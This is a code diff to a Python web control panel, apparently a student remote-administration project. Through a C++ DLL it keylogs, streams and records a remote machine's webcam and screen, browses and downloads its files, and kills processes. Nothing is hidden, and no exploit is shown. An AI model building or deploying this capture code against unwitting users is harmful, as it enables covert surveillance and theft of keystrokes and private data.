@@ -8,12 +8,14 @@ import ctypes
 import threading
 import time
 import socket
+import shutil
 import sys
 import base64
 import hashlib
 import struct
 import sqlite3
 import re
+import cv2
 
 # ---------------- CONFIG ----------------
 HTTP_PORT = 8000
@@ -27,14 +29,20 @@ INSTALLED_TXT = os.path.join(BASE_DIR, "installed.txt")
 KEYLOG_TXT = os.path.join(BASE_DIR, "keylog.txt")
 HISTORY_DB = os.path.join(BASE_DIR, "history.db")
 SCREENSHOT_BMP = os.path.join(BASE_DIR, "screenshot.bmp")
+SCREEN_JPG = os.path.join(BASE_DIR, "screen.jpg")
+camera = cv2.VideoCapture(0)
 
 # ---------------- GLOBALS ----------------
-webcam_running = False
 lib = None
 lib_lock = threading.Lock()  # guard calls to lib if needed
 current_mode = None           # 'webcam', 'screen', 'keylogger',...
 mode_lock = threading.Lock()  # khóa khi đổi mode
 webcam_running = False        # có một stream (webcam/screen) đang chạy hay không
+_stream_thread = None    # handle cho thread stream (nếu cần kiểm tra is_alive)
+webcam_writer = None
+is_recording_webcam = False
+webcam_record_thread = None
+
 
 # ---------------- MODE MANAGER (chèn vào webapp.py, top-level) ----------------
 # modes: keys and human names
@@ -69,54 +77,53 @@ except Exception as e:
     lib = None
 
 # optional auto connect attempt (safe)
+# --- CẬP NHẬT TRONG webapp.py (Đoạn cấu hình DLL) ---
 if lib:
     try:
-        lib.InitWinsock.restype = None
+        # 1. Các hàm trả về CHUỖI (String) - Đây là thay đổi lớn nhất
+        lib.GetAppList.restype       = ctypes.c_char_p
+        lib.GetProcessList.restype   = ctypes.c_char_p # (Nếu có dùng)
+        lib.GetInstalledApps.restype = ctypes.c_char_p
+        lib.GetDrives.restype        = ctypes.c_char_p
+        lib.ExplorePath.argtypes     = [ctypes.c_char_p]
+        lib.ExplorePath.restype      = ctypes.c_char_p
 
+        # 2. Các hàm Giao tiếp cơ bản
+        lib.InitWinsock.restype = None
         lib.ConnectToServer.argtypes = [ctypes.c_char_p, ctypes.c_int]
         lib.ConnectToServer.restype  = ctypes.c_bool
-
         lib.SendStringCmd.argtypes   = [ctypes.c_char_p]
+
+        # 3. Các hàm Điều khiển (Void)
         lib.KillProcess.argtypes     = [ctypes.c_char_p]
         lib.StartProcess.argtypes    = [ctypes.c_char_p]
+        lib.ShutdownServer.restype   = None
+        lib.RestartServer.restype    = None
 
+        # 4. Stream & Media (Giữ nguyên)
         lib.ReceiveWebcamStream.restype = None
         lib.ReceiveScreenStream.restype = None
-
-        lib.GetAppList.restype        = None
-        lib.GetInstalledApps.restype  = None
-
-        lib.GetDrives.restype         = None
-        lib.ExplorePath.argtypes      = [ctypes.c_char_p]
-
-        lib.HookKeylog.restype        = None
-        lib.UnhookKeylog.restype      = None
-        lib.GetKeylog.restype         = None
-
-        lib.GetNotificationHistory.restype = None
+        lib.CaptureScreen.restype       = None
         try:
-            lib.CaptureScreen.restype = None
-        except AttributeError:
-            pass
-
-        try:
-            lib.ReceiveVideoStream.argtypes = [ctypes.c_int]  # duration (giây)
+            lib.ReceiveVideoStream.argtypes = [ctypes.c_int]
             lib.ReceiveVideoStream.restype  = None
-        except AttributeError:
-            pass
+        except AttributeError: pass
 
-        try:
-            lib.ShutdownServer.restype = None
-        except AttributeError:
-            pass
+        # 5. Keylog & Notify
+        lib.HookKeylog.restype   = None
+        lib.UnhookKeylog.restype = None
+        lib.GetKeylog.restype    = None # Vẫn ghi file
+        lib.GetNotificationHistory.restype = None # Vẫn ghi file DB
 
+        # 6. Tải file (Mới thêm)
         try:
-            lib.RestartServer.restype = None
-        except AttributeError:
-            pass
+            lib.DownloadFile.argtypes = [ctypes.c_char_p, ctypes.c_char_p]
+            lib.DownloadFile.restype  = None
+        except AttributeError: pass
 
     except Exception as e:
         print("[DLL] Set argtypes error:", e)
+        
 
 # ---------------- Small helpers for WebSocket ----------------
 WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
@@ -305,117 +312,188 @@ def wait_for_file(path, timeout=2.0, poll=0.05):
 
 
 def stop_current_mode():
-    """Dừng mode hiện tại một cách an toàn (gửi STOP nếu đang stream)."""
-    global current_mode, webcam_running
-
-    # KHÔNG dùng `with mode_lock` ở đây nữa
+    global current_mode, webcam_running, _stream_thread
+    # Không deadlock: stop_current_mode được gọi từ start_mode() khi đã có mode_lock
     if current_mode is None:
         return
 
     print(f"[MODE] Stopping current_mode: {current_mode}")
     try:
+        # Nếu có stream đang chạy ở DLL -> gửi STOP
         if current_mode in ("webcam", "screen"):
-            # Gửi STOP giống main.py khi tắt webcam/screen
-            webcam_running = False
             if lib:
                 with lib_lock:
+                    print("[MODE] Sending STOP to remote (for stream).")
                     lib.SendStringCmd(b"STOP")
-            time.sleep(0.3)
+            # cho server thời gian trả STOPPED / thoát thread
+            time.sleep(0.6)
+            webcam_running = False
+
+            # Nếu chúng ta có handle thread, chờ nó exit một chút
+            if _stream_thread is not None:
+                try:
+                    if _stream_thread.is_alive():
+                        _stream_thread.join(timeout=1.0)
+                except Exception:
+                    pass
+                _stream_thread = None
         else:
-            # Các mode khác nếu server có hỗ trợ STOP thì gửi cho chắc
+            # other modes: send STOP if server supports, short wait
             if lib:
                 with lib_lock:
                     lib.SendStringCmd(b"STOP")
             time.sleep(0.1)
     except Exception as e:
         print("[MODE] stop_current_mode error:", e)
-
     current_mode = None
+
+
+
+def _screen_wrapper():
+    global webcam_running, _stream_thread
+    try:
+        print("[MODE] Screen wrapper started.")
+        # --- BẮT BUỘC KHÔNG ĐƯỢC CÓ: with lib_lock: ---
+        # Chỉ gọi hàm trần thôi:
+        lib.ReceiveScreenStream()
+        # ---------------------------------------------
+    except Exception as e:
+        print("[MODE] Screen error:", e)
+    finally:
+        webcam_running = False
+        _stream_thread = None
+        
+def _webcam_wrapper():
+    global webcam_running, _stream_thread
+    try:
+        print("[MODE] Webcam wrapper started.")
+        # --- QUAN TRỌNG: KHÔNG DÙNG LOCK Ở ĐÂY ---
+        lib.ReceiveWebcamStream() 
+        # ----------------------------------------
+    except Exception as e:
+        print("[MODE] Webcam error:", e)
+    finally:
+        webcam_running = False
+        _stream_thread = None
+
+def record_webcam_task(filename):
+    global is_recording_webcam
+    print(f"[REC] Bắt đầu ghi video vào: {filename}")
+    
+    writer = None
+    last_mtime = 0
+    
+    # Chờ file ảnh xuất hiện
+    while not os.path.exists(WEBCAM_JPG) and is_recording_webcam:
+        time.sleep(0.1)
+
+    try:
+        # Đọc frame đầu tiên để lấy kích thước
+        first_frame = cv2.imread(WEBCAM_JPG)
+        if first_frame is not None:
+            h, w, _ = first_frame.shape
+            # Tạo VideoWriter (FPS 10)
+            writer = cv2.VideoWriter(filename, cv2.VideoWriter_fourcc(*'MJPG'), 10.0, (w, h))
+    except Exception as e:
+        print("[REC] Init error:", e)
+        return
+
+    if not writer:
+        print("[REC] Không thể khởi tạo VideoWriter.")
+        return
+
+    while is_recording_webcam:
+        try:
+            if os.path.exists(WEBCAM_JPG):
+                # Kiểm tra xem file ảnh có mới không (dựa vào thời gian sửa đổi)
+                mtime = os.path.getmtime(WEBCAM_JPG)
+                if mtime > last_mtime:
+                    # Đọc file ảnh an toàn
+                    # (Copy ra temp để tránh xung đột khi DLL đang ghi)
+                    temp_img = WEBCAM_JPG + ".tmp_rec"
+                    shutil.copy2(WEBCAM_JPG, temp_img)
+                    
+                    frame = cv2.imread(temp_img)
+                    if frame is not None:
+                        writer.write(frame)
+                        last_mtime = mtime
+                    
+                    # Xóa file temp nhẹ
+                    try: os.remove(temp_img)
+                    except: pass
+            
+            time.sleep(0.05) # Check mỗi 50ms
+        except Exception as e:
+            print("[REC] Frame error:", e)
+            time.sleep(0.1)
+
+    if writer:
+        writer.release()
+    print(f"[REC] Đã lưu video: {filename}")
+    
 
 def start_mode(mode: str) -> bool:
     """
-    Đổi sang mode mới:
-    - STOP mode cũ (nếu có) + delay ~2s cho TCP bên C++ kịp xử lý
-    - Khởi động logic tương ứng với mode mới
-    - Luôn trả True/False nhanh, KHÔNG block vào vòng nhận ảnh.
+    Start a mode safely:
+      - stop old mode (send STOP)
+      - small wait for TCP to settle
+      - spawn wrapper thread for long-running streams
     """
-    global current_mode, webcam_running
+    global current_mode, webcam_running, _stream_thread
     with mode_lock:
         if current_mode == mode:
             print("[MODE] start_mode: already in mode", mode)
             return True
 
-        # 1. Dừng mode cũ (nếu có)
+        # stop old mode (if any)
         if current_mode is not None:
             stop_current_mode()
-            # cho server C++ đủ thời gian reset trạng thái
-            time.sleep(2.0)      # bạn có thể giảm xuống 1.0 nếu thấy OK
+            # give server time to fully reset sockets
+            time.sleep(1.0)
 
         print("[MODE] Starting mode:", mode)
+
         try:
             if mode == "webcam":
                 if not lib:
                     print("[MODE] No DLL to start webcam")
                     return False
-                # Gọi giống hệt main.py: chỉ spawn thread ReceiveWebcamStream
-                t = threading.Thread(target=lib.ReceiveWebcamStream, daemon=True)
-                t.start()
+                # spawn webcam wrapper thread
+                t = threading.Thread(target=_webcam_wrapper, daemon=True)
+                _stream_thread = t
                 webcam_running = True
+                t.start()
 
             elif mode == "screen":
                 if not lib:
-                    print("[MODE] No DLL to start screen stream")
+                    print("[MODE] No DLL to start screen")
                     return False
-
-                def run_screen():
-                    try:
-                        # Nếu bạn có ReceiveScreenStream riêng thì dùng trực tiếp:
-                        lib.ReceiveScreenStream()
-                        # Hoặc nếu chỉ có ReceiveStreamGeneric:
-                        # lib.ReceiveStreamGeneric(b"SCREEN", b"webcam.jpg")
-                    except Exception as e:
-                        print("[MODE] screen stream error:", e)
-
-                t = threading.Thread(target=lib.ReceiveScreenStream, daemon=True)
-                t.start()
+                # spawn screen wrapper thread
+                t = threading.Thread(target=_screen_wrapper, daemon=True)
+                _stream_thread = t
                 webcam_running = True
-                
+                t.start()
+
             elif mode == "keylogger":
-                # Bật hook keylog, phần đọc nội dung dùng API riêng
                 if lib:
                     with lib_lock:
                         lib.HookKeylog()
-                else:
-                    return False
-
             elif mode == "notify":
-                # Mode này thực chất chỉ là UI; lấy data qua /api/notify/list
-                # Ở đây không cần gửi lệnh gì cả (GetNotificationHistory sẽ làm khi gọi API)
                 pass
-
             elif mode == "files":
-                # Giống vậy: UI gọi /api/files/drives và /api/files/list để lấy explorer.txt
                 pass
-
             elif mode == "apps":
-                # UI tự gọi /api/list_apps để lấy apps.txt
                 pass
-
             elif mode == "process":
-                # UI dùng /api/apps/installed + /api/process/start
                 pass
-
             elif mode == "custom":
-                # Tự chừa ra cho tương lai
                 pass
-
             else:
                 print("[MODE] Unknown mode:", mode)
                 return False
 
             current_mode = mode
             return True
-
         except Exception as e:
             print("[MODE] start_mode exception:", e)
             return False
@@ -424,6 +502,8 @@ def start_mode(mode: str) -> bool:
 # Insert into existing IoTRequestHandler.do_POST handling:
 # Add case for '/api/mode' where client sends JSON: {"mode":"webcam"}
 # And for GET /api/mode to return {"mode": current_mode}
+
+
 
 
 # ---------------- HTTP handler (same as patched) ----------------
@@ -445,8 +525,13 @@ class IoTRequestHandler(http.server.SimpleHTTPRequestHandler):
     # --- Thay thế toàn bộ method do_GET bằng đoạn này ---
     def do_GET(self):
         global webcam_running
+        
+        if self.path == '/':
+            # Chỉ định file cần mở là index.html trong thư mục templates
+            self.path = '/templates/index.html'
+            
         # --- API: lấy danh sách apps (gọi GetAppList + chờ apps.txt) ---
-        if self.path == '/api/mode':
+        elif self.path == '/api/mode':
             self.send_response(200)
             self.send_header('Content-type', 'application/json')
             self.end_headers()
@@ -454,33 +539,27 @@ class IoTRequestHandler(http.server.SimpleHTTPRequestHandler):
             return
     
         elif self.path == '/api/list_apps':
-            print("[HTTP] GET /api/list_apps (calling GetAppList & waiting for file)")
             apps = []
             if lib:
                 try:
-                    with lib_lock:
-                        lib.GetAppList()
-                    # chờ tối đa 2s để C++ ghi apps.txt
-                    ok = wait_for_file(APPS_TXT, timeout=2.0)
-                    if not ok:
-                        print("[HTTP] Warning: apps.txt not ready after GetAppList()")
-                except Exception as e:
-                    print("[HTTP] lib.GetAppList error:", e)
-
-            # đọc file apps.txt (nếu có)
-            try:
-                if os.path.exists(APPS_TXT):
-                    with open(APPS_TXT, "r", encoding="utf-8", errors="ignore") as f:
-                        for line in f:
+                    # Gọi DLL -> Nhận chuỗi ngay lập tức (không cần Lock lâu)
+                    # Dùng lock cực ngắn để tránh gọi trùng lệnh
+                    with lib_lock: 
+                        ptr = lib.GetAppList()
+                    
+                    if ptr:
+                        # Convert C-String -> Python String
+                        data_str = ctypes.string_at(ptr).decode('utf-8', errors='ignore')
+                        
+                        # Phân tích chuỗi (ID|Name|Threads)
+                        lines = data_str.split('\n')
+                        for line in lines:
                             p = line.strip().split('|')
                             if len(p) >= 3:
                                 apps.append({"id": p[0], "name": p[1], "threads": p[2]})
-                else:
-                    print("[HTTP] apps.txt not found (GetAppList may have failed).")
-            except Exception as e:
-                print("[HTTP] read apps.txt error:", e)
+                except Exception as e:
+                    print("[HTTP] GetAppList error:", e)
 
-            # trả JSON (mảng rỗng nếu không có)
             self.send_response(200)
             self.send_header('Content-type', 'application/json')
             self.end_headers()
@@ -580,22 +659,18 @@ class IoTRequestHandler(http.server.SimpleHTTPRequestHandler):
             if lib:
                 try:
                     with lib_lock:
-                        if os.path.exists(EXPLORER_TXT):
-                            os.remove(EXPLORER_TXT)
-                        lib.GetDrives()
-                    ok = wait_for_file(EXPLORER_TXT, timeout=2.0)
-                    if ok and os.path.exists(EXPLORER_TXT):
-                        with open(EXPLORER_TXT, "r", errors="ignore") as f:
-                            for line in f:
-                                p = line.strip().split('|')
-                                if len(p) >= 3:
-                                    entries.append({
-                                        "name": p[0],
-                                        "type": p[1],
-                                        "size": p[2]
-                                    })
+                        ptr = lib.GetDrives()
+                    
+                    if ptr:
+                        data_str = ctypes.string_at(ptr).decode('utf-8', errors='ignore')
+                        lines = data_str.split('\n')
+                        for line in lines:
+                            p = line.strip().split('|')
+                            if len(p) >= 3:
+                                entries.append({"name": p[0], "type": p[1], "size": p[2]})
                 except Exception as e:
                     print("[HTTP] GetDrives error:", e)
+            
             self.send_response(200)
             self.send_header('Content-type', 'application/json')
             self.end_headers()
@@ -604,24 +679,18 @@ class IoTRequestHandler(http.server.SimpleHTTPRequestHandler):
         
         
         elif self.path == '/api/apps/installed':
-            print("[HTTP] GET /api/apps/installed")
             apps = []
             if lib:
                 try:
-                    # Gọi C++ giống main.py :contentReference[oaicite:3]{index=3}
                     with lib_lock:
-                        if os.path.exists(INSTALLED_TXT):
-                            os.remove(INSTALLED_TXT)
-                        lib.GetInstalledApps()
-                    ok = wait_for_file(INSTALLED_TXT, timeout=2.0)
-                    if ok:
-                        with open(INSTALLED_TXT, "r", encoding="utf-8", errors="ignore") as f:
-                            for line in f:
-                                name = line.strip()
-                                if name:
-                                    apps.append({"name": name})
-                    else:
-                        print("[HTTP] installed.txt timeout")
+                        ptr = lib.GetInstalledApps()
+                    
+                    if ptr:
+                        data_str = ctypes.string_at(ptr).decode('utf-8', errors='ignore')
+                        lines = data_str.split('\n')
+                        for line in lines:
+                            if line.strip():
+                                apps.append({"name": line.strip()})
                 except Exception as e:
                     print("[HTTP] GetInstalledApps error:", e)
 
@@ -633,32 +702,74 @@ class IoTRequestHandler(http.server.SimpleHTTPRequestHandler):
         
         # --- Video stream MJPEG từ webcam.jpg ---
         elif self.path == '/video_feed':
-            print("[HTTP] GET /video_feed (stream)")
+            # Stream MJPEG reading file webcam.jpg repeatedly; disable cache
+            self.send_response(200)
+            self.send_header('Content-type', 'multipart/x-mixed-replace; boundary=--jpgboundary')
+            self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
+            self.send_header('Pragma', 'no-cache')
+            self.end_headers()
+
+            boundary = b"--jpgboundary\r\n"
+            img_path = WEBCAM_JPG  # ensure this is the same path DLL writes to
+
+            try:
+                while True:
+                    if not os.path.exists(img_path):
+                        # if not ready, send a tiny placeholder or wait
+                        time.sleep(0.05)
+                        continue
+
+                    try:
+                        # read file bytes atomically
+                        with open(img_path, "rb") as f:
+                            img = f.read()
+                        if not img:
+                            time.sleep(0.02)
+                            continue
+
+                        self.wfile.write(boundary)
+                        self.wfile.write(b"Content-Type: image/jpeg\r\n")
+                        self.wfile.write(f"Content-Length: {len(img)}\r\n\r\n".encode())
+                        self.wfile.write(img)
+                        self.wfile.write(b"\r\n")
+                        # flush
+                        try:
+                            self.wfile.flush()
+                        except Exception:
+                            pass
+
+                        # small delay to avoid busy loop; adjust for fps
+                        time.sleep(0.05)
+                    except BrokenPipeError:
+                        # client disconnected
+                        break
+                    except Exception as e:
+                        print("[HTTP] video_feed read/write error:", e)
+                        time.sleep(0.1)
+                        continue
+            except Exception as e:
+                print("[HTTP] video_feed outer exception:", e)
+            return
+        
+        elif self.path == '/screen_feed':
             self.send_response(200)
             self.send_header('Content-type', 'multipart/x-mixed-replace; boundary=frame')
             self.end_headers()
+
             try:
                 while True:
-                    if os.path.exists(WEBCAM_JPG):
-                        try:
-                            with open(WEBCAM_JPG, "rb") as f:
-                                img = f.read()
-                            # gửi frame
-                            self.wfile.write(b'--frame\r\n')
-                            self.wfile.write(b'Content-Type: image/jpeg\r\n\r\n')
-                            self.wfile.write(img)
-                            self.wfile.write(b'\r\n')
-                        except (BrokenPipeError, ConnectionResetError):
-                            # client đóng kết nối
-                            break
-                        except Exception as e:
-                            print("[HTTP] frame error:", e)
-                    else:
-                        # không có file: đợi 0.1s rồi tiếp tục
-                        pass
-                    time.sleep(0.1)
-            except Exception as e:
-                print("[HTTP] /video_feed exception:", e)
+                    if os.path.exists(SCREEN_JPG):
+                        with open(SCREEN_JPG, 'rb') as f:
+                            frame = f.read()
+
+                        self.wfile.write(b"--frame\r\n")
+                        self.wfile.write(b"Content-Type: image/jpeg\r\n\r\n")
+                        self.wfile.write(frame)
+                        self.wfile.write(b"\r\n")
+
+                    time.sleep(0.05)
+            except (ConnectionResetError, BrokenPipeError, ValueError):
+                pass
             return
 
         # mặc định: phục vụ file tĩnh / index
@@ -666,26 +777,15 @@ class IoTRequestHandler(http.server.SimpleHTTPRequestHandler):
 
     def do_POST(self):
         global webcam_running
+        global is_recording_webcam
         print("[HTTP] POST", self.path)
 
         # ---- Start webcam
         if self.path == '/api/webcam/start':
-            if not webcam_running:
-                webcam_running = True
-                if lib:
-                    try:
-                        # Chỉ gọi trực tiếp hàm stream trong DLL
-                        t_stream = threading.Thread(target=lib.ReceiveWebcamStream, daemon=True)
-                        t_stream.start()
-                        print("[API] Started DLL.ReceiveWebcamStream thread.")
-                    except Exception as e:
-                        print("[API] Failed to start ReceiveWebcamStream:", e)
-                else:
-                    print("[API] No DLL loaded - cannot start webcam.")
-
-            self.send_response(200)
+            ok = start_mode("webcam")
+            self.send_response(200 if ok else 500)
             self.end_headers()
-            self.wfile.write(b"OK")
+            self.wfile.write(b"OK" if ok else b"ERR")
             return
         
         
@@ -722,27 +822,21 @@ class IoTRequestHandler(http.server.SimpleHTTPRequestHandler):
             try:
                 payload = json.loads(data.decode('utf-8'))
                 path = payload.get('path', '')
-            except:
-                path = ''
+            except: path = ''
 
             entries = []
             if lib and path:
                 try:
                     with lib_lock:
-                        if os.path.exists(EXPLORER_TXT):
-                            os.remove(EXPLORER_TXT)
-                        lib.ExplorePath(path.encode('utf-8'))
-                    ok = wait_for_file(EXPLORER_TXT, timeout=2.0)
-                    if ok and os.path.exists(EXPLORER_TXT):
-                        with open(EXPLORER_TXT, "r", errors="ignore") as f:
-                            for line in f:
-                                p = line.strip().split('|')
-                                if len(p) >= 3:
-                                    entries.append({
-                                        "name": p[0],
-                                        "type": p[1],
-                                        "size": p[2]
-                                    })
+                        ptr = lib.ExplorePath(path.encode('utf-8'))
+                    
+                    if ptr:
+                        data_str = ctypes.string_at(ptr).decode('utf-8', errors='ignore')
+                        lines = data_str.split('\n')
+                        for line in lines:
+                            p = line.strip().split('|')
+                            if len(p) >= 3:
+                                entries.append({"name": p[0], "type": p[1], "size": p[2]})
                 except Exception as e:
                     print("[HTTP] ExplorePath error:", e)
 
@@ -916,13 +1010,11 @@ class IoTRequestHandler(http.server.SimpleHTTPRequestHandler):
             return
         
         elif self.path == '/api/screen/snapshot':
+            # call CaptureScreen (DLL) to produce screenshot.bmp or screenshot.jpg
             if not lib:
-                self.send_response(500)
-                self.end_headers()
-                self.wfile.write(b"No DLL")
-                return
+                self.send_response(500); self.end_headers(); self.wfile.write(b"No DLL"); return
 
-            # Xóa file cũ (nếu có) cho chắc
+            # remove old
             try:
                 if os.path.exists(SCREENSHOT_BMP):
                     os.remove(SCREENSHOT_BMP)
@@ -934,31 +1026,54 @@ class IoTRequestHandler(http.server.SimpleHTTPRequestHandler):
                     lib.CaptureScreen()
             except Exception as e:
                 print("[HTTP] CaptureScreen error:", e)
-                self.send_response(500)
-                self.end_headers()
-                self.wfile.write(str(e).encode())
-                return
+                self.send_response(500); self.end_headers(); self.wfile.write(b"Capture error"); return
 
-            # Chờ file screenshot.bmp xuất hiện
-            if not wait_for_file(SCREENSHOT_BMP, timeout=3.0, poll=0.1):
-                self.send_response(500)
-                self.end_headers()
-                self.wfile.write(b"Screenshot not ready")
-                return
+            ok = wait_for_file(SCREENSHOT_BMP, timeout=3.0, poll=0.05)
+            if not ok:
+                self.send_response(500); self.end_headers(); self.wfile.write(b"Screenshot not ready"); return
 
-            # Trả luôn file (Content-Type bmp)
-            try:
-                with open(SCREENSHOT_BMP, "rb") as f:
-                    data = f.read()
+            with open(SCREENSHOT_BMP, "rb") as f:
+                data = f.read()
+            self.send_response(200)
+            self.send_header("Content-Type", "image/bmp")
+            self.send_header("Content-Length", str(len(data)))
+            self.end_headers()
+            self.wfile.write(data)
+            return
+        
+        elif self.path == '/api/webcam/record/start':
+            
+            if not is_recording_webcam:
+                is_recording_webcam = True
+                # Tạo tên file: webcam_năm-tháng-ngày_giờ-phút-giây.avi
+                t_str = time.strftime("%Y%m%d_%H%M%S")
+                filename = os.path.join(BASE_DIR, f"webcam_{t_str}.avi")
+                
+                t = threading.Thread(target=record_webcam_task, args=(filename,))
+                t.daemon = True
+                t.start()
+                
                 self.send_response(200)
-                self.send_header("Content-Type", "image/bmp")
                 self.end_headers()
-                self.wfile.write(data)
-            except Exception as e:
-                print("[HTTP] read screenshot error:", e)
-                self.send_response(500)
+                self.wfile.write(b"STARTED")
+            else:
+                self.send_response(200)
                 self.end_headers()
-                self.wfile.write(str(e).encode())
+                self.wfile.write(b"ALREADY_RUNNING")
+            return
+
+        # --- [MỚI] API STOP RECORD WEBCAM ---
+        elif self.path == '/api/webcam/record/stop':
+            if is_recording_webcam:
+                is_recording_webcam = False
+                time.sleep(0.5) # Chờ luồng ghi đóng file
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(b"STOPPED")
+            else:
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(b"NOT_RUNNING")
             return
         
         elif self.path == '/api/power':
